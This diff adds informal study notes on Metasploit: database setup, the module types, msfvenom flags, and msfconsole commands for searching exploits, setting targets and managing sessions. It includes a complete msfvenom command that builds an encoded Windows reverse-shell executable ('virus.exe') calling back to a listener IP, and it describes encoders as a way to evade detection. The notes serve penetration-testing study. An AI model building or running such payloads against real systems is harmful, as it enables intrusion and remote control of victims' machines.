@@ -1,0 +1,59 @@
+To use the metasploitable we have to connect it to the database that save all of the thingd we do in it.
+ i.e : msfdb
+ msfdb reinti
+ to check that the db is connected or not run the msfconsole and run
+
+ db_status
+
+ /usr/share/metasploitable-framework/modules/
+ it conatins modules  
+
+ 1-  Auxiliary : contains fuzzers, scanners and enumeration scripts
+ 2-  Encoders  : we use to make undetectable   , shikata has the best ratngs 
+ 3-  Evasion  :  is for windows 
+ 4-  Nops :   to ensure that there are no Null character or bad character before shell code.
+
+ ------------------------- msfvenom --------------------------
+ iterations are used by the encoders. 
+ msfvenom -l all , list every module i can use with msfvenom
+
+
+msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.174.129 LPORT=1234 -a x86 -b "\x00\x0a\x0d" 
+-e x86/shikata_ga_nai -f exe -i 3 > virus.exe
+
+-p payload , -a  architecture, -b to remove the null characters these bad characters are :
+    new line
+    null character
+    carriage return these are also unseen on the web 
+-e encoder, -f format, > [path], -i iteration 
+
+help , for help in msfconsole
+banner  , this use to see the banners that we see when we on the msfconsole
+search -h 
+search badblue (server name ) ,  by this we can search the exploits        or
+search type:exploit (or payload) badblue or anything
+grep badblue search exploits
+grep portscan search auxiliary
+
+after seacrhing if we want to use it we write the word "use"
+use [(number) or (full statement of that module or payload)]
+
+show options , to see the options that has set 
+back , to get back from it 
+show targets ,  to check pn which these scripts or payload wil be work or specially made for 
+set RHOSTS [ip]
+unset RHOSTS
+setg RHOSTS [ip] , this wil set the RHOSTS value globally 
+unsetg RHOSTS ,  to unset these values 
+run  ,  run the exploits
+sessions -l ,  list ll the sessions
+sessions -i ,   sessions we are interacting with 
+
+if there is any than we write
+sessions -i [id (i.e:1 or anything)]  ,    to interact with the 1st session
+kill [session id] , to kil that session
+
+db_nmap  ,   it will store the scan in the postgresql
+hosts  ,  list the hosts we have detected so far 
+vulns  ,  have the track of the host and their respective vulnerabilities   
+
